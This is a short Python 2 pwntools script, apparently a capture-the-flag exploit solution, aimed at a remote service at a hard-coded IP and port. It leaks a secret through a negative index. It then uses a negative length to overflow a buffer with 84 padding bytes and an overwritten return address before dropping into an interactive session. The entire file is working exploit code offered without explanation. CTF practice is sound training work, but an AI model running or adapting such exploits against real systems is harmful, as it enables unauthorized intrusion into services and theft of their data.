#!/usr/bin/env python2

from pwn import *

conn = remote('140.113.194.66', 8787)

conn.recvuntil('choice: ', drop=False)
conn.sendline('1')
conn.recvuntil('id: ', drop=False)
conn.sendline('-1')
conn.recvuntil('Age: ', drop=False)
secret = conn.recvline()[:-1]
print secret

conn.recvuntil('choice: ', drop=False)
conn.sendline('2')
conn.recvuntil('first: ', drop=False)
conn.sendline(secret)
conn.recvuntil('id: ', drop=False)
conn.sendline('0')
conn.recvuntil('length: ', drop=False)
conn.sendline('-1')
payload = 'a' * 84
payload += '\x3b\x88\x04\x08'
conn.sendline(payload)

conn.recvuntil('choice: ', drop=False)
conn.sendline('3')

conn.interactive()
